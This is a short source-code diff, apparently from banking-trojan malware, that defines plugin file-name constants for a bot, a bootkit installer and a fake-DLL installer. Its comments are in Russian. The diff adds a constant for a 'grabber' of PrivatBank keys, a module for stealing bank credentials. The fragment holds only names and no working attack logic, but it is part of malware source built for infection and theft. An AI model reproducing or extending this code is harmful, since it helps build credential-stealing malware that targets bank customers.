@@ -96,6 +96,11 @@ CSSTR EStrBotPlug[] = "bot.plug";
 // Имф инсталтора буткита
 CSSTR EStrBootkitInstaller[] = "bki.plug";
 
+
+//Имя систем граберов
+CSSTR EStrSystemPrivat[] = "privat"; // Грабер ключей приватбанка
+
+
 // Имя инсталятора фэкедлл
 CSSTR EStrFakeDllInstaller[] = "fdi.plug";
 // Имя файла по которому определяем, что установлена фейкдлл (файл в папке бота)
